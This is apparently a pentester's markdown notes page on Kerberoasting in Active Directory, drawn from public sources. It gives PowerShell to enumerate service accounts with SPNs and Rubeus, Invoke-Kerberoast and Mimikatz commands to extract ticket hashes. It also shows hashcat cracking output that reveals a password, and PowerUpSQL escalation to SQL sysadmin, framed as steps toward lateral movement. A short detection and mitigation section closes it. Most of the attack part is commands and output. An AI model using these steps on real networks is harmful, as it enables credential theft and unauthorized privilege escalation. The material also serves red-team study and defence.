
To see : [[SPN - Service principal name]]

Sources : 
https://en.hackndo.com/kerberoasting/
https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast


TGS request can be made by specifying arbitrary SPN. If those [SPN](https://en.hackndo.com/service-principal-name-spn) are registered in the Active Directory, the domain controller will provide a piece of information **encrypted with the secret key of the account executing the service**. With this information, the attacker can now try to recover the account’s plaintext password via a brute-force attack.

Most of the accounts that runs services are machine accounts (`MACHINENAME$`) and their password are very long, complex and completely random, so they’re not really vulnerable to this type of attack. However, there are some services executed by accounts whose password have been chosen by a humans. It is those accounts that are much simpler to compromise via brute-force attack, so it is those accounts which will be targeted by a **Kerberoast** attack.

PowerShell script allowing you to retrieve users with at least one [SPN](https://en.hackndo.com/service-principal-name-spn) : 
```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```

Tools : 
-  [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) : 
```
Invoke-Kerberoast -domain adsec.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

 -  [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) provided by Impacket


# Steps 

### - Enumerates SPN

```powershell
#Build LDAP filter to look for users with SPN values registered for current domain
$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
#Execute Search
$results = $search.FindAll()
#Display SPN values from the returned objects
$Results = foreach ($result in $results)
{
	$result_entry = $result.GetDirectoryEntry()
 
	$result_entry | Select-Object @{
		Name = "Username";  Expression = { $_.sAMAccountName }
	}, @{
		Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }
	}
}
 
$Results
```

Results: 

```powershell
Username        SPN
--------        ---
ServiceAccount1 http/webserver1
ServiceAccount2 cifs/appserver2
```


### -  Request TGS tickets and extract password hash
```powershell
PS> .\Rubeus.exe kerberoast /simple /outfile:hashes.txt
 
[*] Action: Kerberoasting
 
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
 
[*] Searching the current domain for Kerberoastable users
 
[*] Total kerberoastable users : 2
 
[*] Hash written to C:\Tools\hashes.txt
 
[*] Roasted hashes written to : C:\Tools\hashes.txt
 
PS> Get-Content .\hashes.txt
 
$krb5tgs$23$*ServiceAccount1$domain.com$http/webserver1*$45FAD4676AECDDE4C1397BFCED441F79$DEB234D8A44B2ACD16F31F3ED42B54226E2D72890870966AB5158FFC5B2EC2B4A5D956BDB157A725E6E3A4A800F626D17BB3B6FE62CDF2BAD53EA337A5E8CC6627B8CB6A32B18B914B48D95C6544C9F57C83BEF4726224507002367AA868C76854138E6A7419376343DD5131614C7B97EBC73087312EBA06FF4B067DD261AECADDDB3118C4BDDCC662AAC91C0BEBA082197D4A48E172DBE5F5A4B5DB94B1FF6EED0968243010241B7F1588E2924E631C36915E055E1A364727B79F171F2A5150E544334F5F8D1A7980645F04F4794F2EF5FECA23A9D7EEB5A38490E1A56BAB4C17A6F7B009121E405C41A22B11F4980760A3F1D2D80B52FCD3C1CF60B09C54C77BF7D08BFCF40D90498600958D56BA704EAA2101A17AA5A2A1CCA8A90752C68A1E427757A10603DC8EA62CC03196595BEC2667DA096ECDB8E5F0D11963FD52558E06F3489378B596E26F638DBB738AA214F7282B1970023D7995597651B5BB7FDCF414C53BDF791C569EB8E45B6BE36F49E87080177211ADC3D4F53F0D109A9718497E18E85FDD5C3AD376AFD95372674C318C9E690BC8A6C75DD888BCC8129F15EE7D1C625951C979B97E21538619ABA93D9DD5E32D7549A2ED3406E42F21BD9535759B92F48BC767FC1A327E0F3CAC7ACCE2AB577E2E4103F6F8DE737AB80E1A177F50B6405B05EFD5004006F99548725D785E95498DCBE85F1B6409FE2F43FE0AF185CF8E4AE3E8E581B26FC0C485380BE8811347492004BC9C733EDCA31E538796AC0F908F5487A83478D271A6ADEBF4B816207E745E84B9009F4ACC77872DF0F3D9CE327DB25AA3408823CC5F139E7D12C115BDB487E4D531CE7374E1C90ED9F732E4EA04FF0EB4B84F323A98B95951AE2AAA98735522BC51596F17B5050B4F74045195C6FDC748E1EA4BE35C4DE8253077CA1F659BECC45E87663965073A5EE8D86B042A37ACC16EF64014D7E0DC8CC505CA7F8727F00D0D046805B9F8D5BCC6FF5368B5D6758F4F1A33F26C3C3D91C2359256B19292E02536153062DC3E7FC153AD6607D695BCB0DF66A88653E495C17FD2EB091274947AB4F31C8B756FFC9F40EBF0B661E54C31ABC1E5BE66E6C37807CE17BB1AA4E2ED5D4DE70E90DF602542BFD0A1A4B149F060496F09F0E03E1814A3AAE19A23195859F82C778324FE491024FF63BBB919F958447936B1DACD294B122EE0E85C2374C1192555C0C1CD66D877AF1A77826BE42017B75A5441822E9DAAD7C02366DD5907DD1517A4AEFBAB8F8ECCD1AE1910AB17E40E1E87E288250EE468F0D0AC81C36ACC9AF3524DBEA9DDFB8C08DF0872F4C01574798F28E8017AC5799D9773BDE87A2D6682F9C76493BD738E177E68F20D4310B5AA09D4672BC6C5B0FFB60F5F2A178D7C0EF8477E9B4F9194C5AB350DFA9568C5448BDB85C09A1E623DD683FBFE817004A6C188DE29699A4F85DE3D6075E7022B6CE9E744E518AA4CCB56F876047E4E07A94F99BC8AF68BD9E0FD256EBAD615BB8B4DFB89CFC7E5D2E2D71F07D9F67DDCFE72AD7B24EFD29EF5FF90A21E970011C11CDBC5D754382D359B775CFAD7FAD5FFB35FFB38EB4A1DEF06B331EF549478E7A227C39E49ED82C737EC4A23A4073AD816C2243BD88A7F5983B3
# ... output truncated ... #
```

or


```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```

### - Crack the password offline

```powershell
PS> .\hashcat.exe -m 13100 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt
...
 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133...b80b25
Time.Started.....: Thu Jul 23 18:58:36 2020 (0 secs)
Time.Estimated...: Thu Jul 23 18:58:36 2020 (0 secs)
Guess.Base.......: File (.\wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    97694 H/s (0.26ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 100/100 (100.00%)
Rejected.........: 0/100 (0.00%)
Restore.Point....: 0/100 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> taylor
Hardware.Mon.#1..: Temp: 47c Fan: 34% Util: 32% Core:1265MHz Mem:2504MHz Bus:16
 
PS> Get-Content .\cracked.txt
$krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133a0ca7f310381a7294099034$53db15e3d6211b716229530340031738ba46384e304de689a9303c218c1a2199e398df6fced43647c8f0e0cbf805b277ce78c70b0af34edc9c8ca15fa488cbe455771be3c0fd1cae22322ba60bed2aa4a033a7d9d40b2d61c65f10648f061c0d77d42870e6841635b3afe90df0cfc644f0797188c5bf5486e4529af8aff7f0e9e792b550623c1054250496272673d875eb6ede6f6f3e360ee0d9f173073c92ea7b2ec39a1012bd7c24e861eec4cc29c7b67ed8969f981559f19532ca8beb4edbbd4c5edc7c405158a04974bd767490b4a5895db36fa85fa24bf89cd9b4927b4b07e19516a2e6beb18aa71e5a04b2f157e1c24e26102d1855f76c2f17c9c79264774d3a67e1dd859d190e59ea29f3b82605c599160f3d5dd3830485675329e5e6ddf4b4f5ecba7e101256e1bf15b85f2f294ef90eb7bd8849f51fd120c33682006e75c87f1e04b42f79bc702a8879f4513f38dcf0ba209ebddeebaac06e751c578b02144f670408d3c66720c3312524e44d46ff7ad127cb96acc03afadee97d8a4f5fc15139998025a314559a160b274d373e9d08554e5a49397d0ae048a0437144956e3e6e50efee9b3ac2e4aeb779a4e4419571076400d716bd09d81eca1bcf392ab8f7d5cec47b44ab6be64d389fe45f1511fdef7d89baa4dc5eac18947b2dcc9458a6a8c02b4ea3e5a4309c5dec905638e32ee77158f861564660f6568455834c0622a8cb2db482603bc31501f1c7eb0c9e3c96dcd09ca055bd8f255436330d7ad6b433c6a4faee5c18d1e5ba13ca1225a9b6d71334c1b2d2482f207bdfb73373de8c48dedf68d8b7e5f042f139ba808a186d09d7f7283d25ab59f9255060e49db4f1a0358e15ea0448399b28b2c58758a968a825565b6b9cd362aba4f6dba7a882b14e983e55ba244eb4ca7496e74f8fe9a53485cde9309686120d5e9ec1d1d1b77e4d99f6334c4a674927e1b6b5086d7069f2119b1f63398deba1ae209d83135b2f5bdf094bea2990243eb96c360b272fd0738dcdc94cbc854f7543bbad5cc0d9344e2ccf7a269cf0fad223f6a60fe31d4abbde5710ce6f1b77ff510492781699631369dfdef853045131eaa711b4d02fa1f4f3a8f7e2dfb1b8752ba1e57bf63aac36d1e37c34aa4ed9446e206729f803b45fbc38452adec2989d383172b0b7948d2ab26c24d8aeb7175dc4f133999c4206564a833c49c288039faa0c1899bfd0a5331da87b5612397ee283bd70b2c77156c54f4c96b08ec7b2e7d93b80eed44102e467d26dcfe8433d3afdbe5c04768913f503aaf3f410c8c0abb415d9f5c4f3fd276e23bb7637970983fa0cc85c6b7fd54fb8c715c94e51573eb469a781125c30735e0cc996069a4c708a458952cabf0030614f32f5a0555de2302a20dd864df969ef534b2de1608d9675581ea4c590973f0c9c84ca56e2a34c3427a08ee06827133b75a97a03ec0b5a0ed814a9bd897732dc10e15c3dcf16d67d7790449df40e8b35dee6f40008029d9bc4adbe073755a9429684631c7c790b0855187cfc16cf358a8099ffaceb4836ed1b026756c21d93da72b4aeaf62ff7ce20caf30451416aef2e68812ac1888c02f62d6c5f3500d92119eddc0d01d2548af55cbb5af3fc52adbb80b25:P@ssword!23
 
# ServiceAccount1 has a password of: P@ssword!23
```

### - Use priviledge to further obj

```powershell
PS> runas /netonly /User:ServiceAccount1 powershell.exe
Enter the password for ServiceAccount1: P@ssword!23
 
PS> Import-Module .\PowerUPSQL
PS> $SQLServers = Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-object { $_.Status -eq "Accessible" }
PS> $SQLServers | Get-SQLServerInfo | Select-Object Instance, IsSysadmin -Unique
 
Instance        IsSysadmin
--------        ----------
SQLServer1      No
 
PS> Invoke-SQLEscalatePriv -Instance SQLServer1 -Verbose
VERBOSE: SQLServer1 : Checking if you're already a sysadmin...
VERBOSE: SQLServer1 : You're not a sysadmin, attempting to change that...
# ... output truncated ... #
VERBOSE: SQLServer1 : Success! You are now a Sysadmin!
 
PS> $SQLServers | Get-SQLServerInfo | Select-Object Instance, IsSysadmin -Unique
 
Instance        IsSysadmin
--------        ----------
SQLServer1      Yes
```

Ccl : 
Use for lateral movement

## Mitigation 

-  Security Event ID 4769 – A Kerberos ticket was requested
	-  Service name should not be krbtgt
	- Service name does not end with $ (to filter out machine accounts used for services)
	- Account name should not be machine@domain (to filter out requests from machines)
	- Failure code is '0x0' (to filter out failures, 0x0 is success)
	- Most importantly, ticket encryption type is 0x17
- Service Account Passwords should be hard to guess (greater than 25 characters)
- Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)